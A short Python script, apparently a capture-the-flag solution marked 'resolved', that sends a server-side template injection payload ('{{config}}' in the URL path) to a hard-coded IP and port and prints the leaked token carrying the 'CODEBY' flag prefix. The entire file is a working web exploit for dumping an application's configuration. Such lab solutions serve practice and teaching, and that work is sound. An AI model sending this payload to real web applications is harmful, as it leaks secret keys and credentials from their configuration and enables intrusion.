# resolved
# coding=utf8
import requests


url = 'http://62.173.140.174:16004/{{config}}'
site_pars = requests.session()
html = site_pars.get(url).content
for i in html.split():
    if b'CODEBY' in i:
        print(i[5:-6])
